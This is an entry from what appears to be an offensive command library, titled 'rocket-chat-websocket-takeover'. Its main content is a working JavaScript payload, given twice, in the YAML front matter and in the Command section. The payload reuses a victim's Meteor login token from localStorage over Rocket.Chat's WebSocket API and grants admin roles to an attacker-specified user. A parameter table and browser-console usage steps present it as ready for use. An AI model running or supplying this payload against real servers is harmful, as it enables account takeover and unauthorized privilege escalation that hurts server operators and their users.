---
data: >-
  let ws
  =newWebSocket(`wss://${window.location.host}/sockjs/111/evilwss/websocket`);
  ws.onmessage=function(evt){if(/\["{\"msg\":\"pong\"}"\]/.test(event.data)){
  ws.send('[{"msg":"pong"}]');}if(/a\["{\"server\_id\":\"(.*)\"}"\]/.test(event.data)){
  ws.send('[{"msg":"connect","version":"1","support":["1","pre2","pre1"]}]');
  ws.send(`[{"msg":"method","method":"login","params":[{"resume":"${localStorage.getItem('Meteor.loginToken')}"}],"id":"1"}]`);}if(/a\["{\"msg\":\"connected\",\"session\":\"(.*)\"}"\]/.test(event.data)){
  ws.send('[{"msg":"method","method":"insertOrUpdateUser","params":[{"_id":"{ATTACKER_USERID}","statusText":"","email":"{ATTACKER_EMAIL}","verified":false,"password":"","requirePasswordChange":false,"joinDefaultChannels":false,"sendWelcomeEmail":false,"roles":["user","admin"]}],"id":"17"}]');}};
tags:
  - websocket
  - takeover
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.247Z'
id: 7e8d5526-eeb7-452a-8bd3-c3cff9be54ee
verified: false
validated: true
submitted: true
---
# rocket-chat-websocket-takeover

## Command

```javascript
let ws =newWebSocket(`wss://${window.location.host}/sockjs/111/evilwss/websocket`); ws.onmessage=function(evt){if(/\["{\"msg\":\"pong\"}"\]/.test(event.data)){ ws.send('[{"msg":"pong"}]');}if(/a\["{\"server\_id\":\"(.*)\"}"\]/.test(event.data)){ ws.send('[{"msg":"connect","version":"1","support":["1","pre2","pre1"]}]'); ws.send(`[{"msg":"method","method":"login","params":[{"resume":"${localStorage.getItem('Meteor.loginToken')}"}],"id":"1"}]`);}if(/a\["{\"msg\":\"connected\",\"session\":\"(.*)\"}"\]/.test(event.data)){ ws.send('[{"msg":"method","method":"insertOrUpdateUser","params":[{"_id":"{ATTACKER_USERID}","statusText":"","email":"{ATTACKER_EMAIL}","verified":false,"password":"","requirePasswordChange":false,"joinDefaultChannels":false,"sendWelcomeEmail":false,"roles":["user","admin"]}],"id":"17"}]');}}; 
```

## Description

JS to connect via WebSocket, login with stolen token, and assign admin roles to attacker user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| {ATTACKER_USERID} | Attacker's user ID | Yes |
| {ATTACKER_EMAIL} | Attacker's email | Yes |
| localStorage.getItem('Meteor.loginToken') | Stolen token | Yes |
| wss://.../websocket | WS endpoint | Yes |
| roles | Array with 'admin' | Yes |

## Examples

### Basic Usage

Execute in browser console with placeholders replaced.

## Expected Output

WS connection, login success, user update confirmation.

## Related

- [[procedures/Authenticate-and-Escalate-via-WebSocket]]
